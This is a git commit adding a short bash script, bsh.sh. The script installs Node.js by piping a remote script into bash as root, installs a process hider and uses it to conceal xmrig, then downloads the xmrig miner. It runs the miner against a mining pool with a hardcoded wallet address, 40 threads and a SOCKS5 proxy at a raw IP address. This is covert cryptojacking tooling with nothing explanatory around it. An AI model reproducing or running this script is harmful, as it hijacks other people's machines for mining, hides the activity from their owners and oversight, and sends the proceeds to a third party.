44c44465557594e8ca887d5ed1e58944d887eae6
mrwhjo <100627472+mrwhjo@users.noreply.github.com>
2022-03-01 03:38:32 +0700

    Create bsh.sh

---
+++ bsh.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+sudo su --command "sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add xmrig && wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz && tar -zxf xmrig-6.16.2-bionic-x64.tar.gz && cd xmrig-6.16.2 && chmod +x xmrig && ./xmrig -o randomARQ.mine.zergpool.com:4464 -a rx/arq -k -u 1EZCD9iejENLbMEDtvRwiADPf94EdC81B5-p c=BTC,mc=GNTL --threads=40 -x socks5://192.252.214.20:15864"
